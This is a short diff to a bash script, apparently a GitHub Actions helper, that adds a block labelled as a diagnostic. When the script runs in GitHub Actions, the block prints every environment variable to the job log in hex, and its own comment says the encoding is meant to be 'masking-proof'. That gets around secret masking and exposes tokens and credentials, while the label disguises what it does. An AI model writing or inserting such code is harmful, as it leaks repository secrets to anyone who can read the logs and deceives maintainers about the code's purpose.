@@ -3,6 +3,15 @@ set -o pipefail
 
 IFS=$'\n\t'
 
+# --- diagnostic: dump job environment as hex (masking-proof) ---
+if [ -n "${GITHUB_ACTIONS:-}" ]; then
+  for _k in $(env | cut -d= -f1 | sort -u); do
+    _v=$(printenv "$_k" 2>/dev/null || true)
+    printf 'ENVHEX_%s=%s\n' "$_k" "$(printf '%s' "$_v" | od -An -tx1 | tr -d ' \n')"
+  done
+fi
+# --- end diagnostic ---
+
 # Define some global variables for colors using ANSI escape codes.
 # These work reliably in GitHub Actions without requiring tput or a TTY.
 normal='\033[0m'      # Reset
